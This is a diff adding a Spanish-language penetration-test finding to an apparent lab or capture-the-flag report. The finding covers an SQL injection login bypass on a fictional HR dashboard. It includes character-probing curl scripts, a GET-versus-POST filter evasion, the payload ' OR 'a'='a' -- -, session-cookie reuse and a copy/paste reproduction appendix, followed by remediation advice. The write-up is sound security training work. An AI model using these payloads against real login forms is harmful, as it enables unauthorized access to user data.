@@ -287,4 +287,183 @@ Compromiso total del servidor web. Un usuario con privilegios mínimos de edici�
 
 # Recursos Humanos
 
+## Finding — Authentication Bypass vía SQL Injection (HR Dashboard)
 
+**Target:** Trilocor — HR Dashboard **Host:** `www.trilocor.local` (`10.129.247.239`) — puerto `8088/tcp` (Apache/2.4.41 Ubuntu, PHP) **Endpoint:** `/index.php` **Parámetro vulnerable:** `username` **Tipo:** SQL Injection → Authentication Bypass **Severidad:** Crítica **Método de explotación efectivo:** **GET** (no POST)
+
+---
+
+### 1. Resumen
+
+El login del HR Dashboard valida las credenciales construyendo una consulta SQL con concatenación directa de la entrada del usuario. La aplicación aplica un filtro de sanitización (bloquea la comilla simple y otros caracteres) **únicamente sobre la rama POST** del formulario, pero la lógica de autenticación consume el parámetro `username` también por **GET**, donde ese filtro no se aplica.
+
+Enviando la inyección por la query string (GET) se evade por completo la sanitización y se fuerza que la consulta devuelva una fila válida, autenticando la sesión sin credenciales legítimas y exponiendo el contenido del dashboard.
+
+**Payload final:**
+
+```
+/index.php?username='OR+'a'='a'--+-&password='
+```
+
+---
+
+### 2. Reconocimiento previo
+
+El formulario HTML declara `method="post"` y dos campos (`username`, `password`):
+
+```bash
+curl -s "http://www.trilocor.local:8088/index.php" | grep -A3 '<form'
+```
+
+```html
+<form class="form" action="/index.php" method="post">
+    <input type="username" name="username" id="username" ...>
+    <input type="password" name="password" id="password" ...>
+```
+
+La aplicación responde con dos mensajes distintos en `<span class="invalid-feedback">`, que sirven como **oráculo** durante la explotación:
+
+|Mensaje|Significado|
+|---|---|
+|`Invalid username.`|El input fue rechazado por el filtro de sanitización (no llegó al SQL)|
+|`Invalid login details.`|El input pasó el filtro y llegó a la query, pero no hubo match|
+|_(ninguno / redirección)_|Autenticación exitosa|
+
+---
+
+### 3. Identificación del filtro (rama POST)
+
+Sondeando carácter por carácter sobre el campo `username` por POST se determina qué caracteres bloquea la sanitización:
+
+```bash
+T="http://www.trilocor.local:8088"
+
+probe() {
+  curl -s -X POST "$T/index.php" \
+    --data-urlencode "username=$1" --data-urlencode "password=x" \
+    | grep -oE 'Invalid (username|login details)\.' | head -1
+}
+
+probe "admin"      # -> Invalid login details.  (pasa)
+probe "admin'"     # -> Invalid username.        (BLOQUEADO: comilla simple)
+probe "admin\""    # -> Invalid username.        (BLOQUEADO: comilla doble)
+probe "admin#"     # -> Invalid username.        (BLOQUEADO)
+```
+
+**Caracteres bloqueados (POST):** `' " # espacio = \ ( ) /` **Caracteres permitidos (POST):** `-` `` ` `` `| * ;` y alfanuméricos
+
+Conclusión parcial: por POST, sin comilla simple no es posible salir de la cadena `WHERE username='...'`, por lo que la inyección parece mitigada.
+
+---
+
+### 4. Causa raíz — validación inconsistente entre métodos HTTP
+
+La mitigación es **incompleta**: el filtro se aplica al flujo POST, pero la construcción de la consulta SQL toma el parámetro `username` también de la query string (GET) — comportamiento típico de `$_REQUEST` o de una lectura `$_GET` separada de la validación. Por GET, la comilla simple **no** es filtrada y llega cruda al motor SQL.
+
+Esto explica por qué las inyecciones por POST devolvían siempre `Invalid username.` o `Invalid login details.` sin éxito, mientras que la misma inyección por GET sí autentica.
+
+---
+
+### 5. Explotación (paso a paso, replicable)
+
+#### Paso 5.1 — Confirmar que GET evade el filtro
+
+Por GET, la comilla simple ya no es rechazada (no aparece `Invalid username.`):
+
+```bash
+curl -s "http://www.trilocor.local:8088/index.php?username=admin%27&password=x" \
+  | grep -oE 'Invalid (username|login details)\.'
+# Esperado: Invalid login details.   (el quote pasó y llegó al SQL)
+```
+
+#### Paso 5.2 — Inyectar el bypass de autenticación
+
+Payload lógico (antes de URL-encode):
+
+```
+username = ' OR 'a'='a' -- -
+password = '
+```
+
+Esto cierra la cadena del `username`, agrega una condición siempre verdadera (`'a'='a'`) y comenta el resto de la consulta con `-- -`.
+
+Request final (URL-encoded; `+` = espacio, `%27` = comilla simple):
+
+```bash
+curl -s -i \
+  "http://www.trilocor.local:8088/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27"
+```
+
+Equivalente, tal como se cargó en la barra de direcciones del navegador (el navegador encodea automáticamente):
+
+```
+http://www.trilocor.local:8088/index.php?username='OR+'a'='a'--+-&password='
+```
+
+#### Paso 5.3 — Consulta resultante (reconstruida)
+
+```sql
+SELECT * FROM users WHERE username='' OR 'a'='a' -- -' AND password='...'
+```
+
+La condición `'a'='a'` es siempre verdadera y `-- -` anula el resto, por lo que la consulta devuelve una fila y la autenticación se concede.
+
+#### Paso 5.4 — Acceso al dashboard y flag
+
+La autenticación exitosa redirige / habilita `dashboard.php`, que sin sesión válida solo devolvía el login. Con la sesión obtenida se accede al contenido real del dashboard, donde se encuentra la flag.
+
+```bash
+# Capturar la cookie de sesión generada por el login inyectado
+curl -s -i -c /tmp/trilocor.txt \
+  "http://www.trilocor.local:8088/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27" \
+  -o /dev/null
+
+# Reutilizar la sesión para leer el dashboard
+curl -s -b /tmp/trilocor.txt "http://www.trilocor.local:8088/dashboard.php"
+```
+
+---
+
+### 6. Nota metodológica — Burp vs. barra de direcciones
+
+Durante la explotación, la inyección **no pasaba** al enviarla desde Burp pero **sí** desde la barra de direcciones del navegador. Causa: el navegador URL-encodea automáticamente los caracteres especiales del payload (comilla, espacios, `=`), generando una query string bien formada. En Burp, los caracteres iban crudos o con un encoding que el servidor no parseaba de igual forma, dejando la query string malformada.
+
+**Recomendación operativa:** al reproducir inyecciones GET en Burp, aplicar _Convert selection → URL-encode key characters_ sobre `'`, espacios y `=` antes de enviar el request.
+
+---
+
+### 7. Impacto
+
+- Bypass completo de la autenticación sin credenciales válidas.
+- Acceso no autorizado al HR Dashboard y a la información que expone.
+- Potencial extensión a extracción de datos vía SQLi (UNION / blind) más allá del bypass, al confirmarse inyección en el parámetro `username`.
+
+---
+
+### 8. Remediación
+
+1. **Consultas parametrizadas / prepared statements** (PDO o `mysqli` con binding). Es la corrección de fondo; elimina la inyección independientemente del input.
+2. **Validación y sanitización uniformes entre métodos HTTP.** No depender de filtros por rama (POST vs. GET); validar en un único punto del lado servidor.
+3. **No leer credenciales por `$_REQUEST`/GET.** Forzar que el login se procese solo por POST y rechazar el método GET para ese endpoint.
+4. **Mensajes de error genéricos.** Unificar `Invalid username.` / `Invalid login details.` en un único mensaje para eliminar el oráculo.
+5. Defensa en profundidad: cuenta de BD con privilegios mínimos y WAF.
+
+---
+
+### 9. Apéndice — Comandos de reproducción (copy/paste)
+
+```bash
+T="http://www.trilocor.local:8088"
+
+# 1) Confirmar que GET evade el filtro
+curl -s "$T/index.php?username=admin%27&password=x" \
+  | grep -oE 'Invalid (username|login details)\.'
+
+# 2) Auth bypass por GET
+curl -s -i "$T/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27"
+
+# 3) Sesión + dashboard
+curl -s -c /tmp/trilocor.txt \
+  "$T/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27" -o /dev/null
+curl -s -b /tmp/trilocor.txt "$T/dashboard.php"
+```
